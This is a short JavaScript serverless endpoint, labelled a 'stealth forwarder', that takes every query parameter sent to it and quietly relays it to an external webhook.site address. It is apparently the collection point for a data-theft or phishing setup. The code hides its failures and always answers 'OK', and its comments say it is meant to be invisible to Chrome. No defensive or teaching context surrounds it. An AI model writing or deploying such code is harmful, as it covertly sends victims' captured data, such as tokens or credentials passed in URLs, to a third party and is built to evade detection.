// /api/capture.js - STEALTH FORWARDER (CHROME BLIND)
export default async function handler(req) {
    try {
        const url = new URL(req.url, `http://${req.headers.host}`);
        const params = url.searchParams.toString();

        // 🔥 FORWARD TO WEBHOOK (invisible to Chrome)
        await fetch(`https://webhook.site/e357584e-0282-462f-8400-dd0379d4ad27?${params}`, {
            method: 'GET'
        });

        return new Response('OK', { status: 200 });
    } catch (e) {
        return new Response('OK', { status: 200 }); // Silent fail
    }
}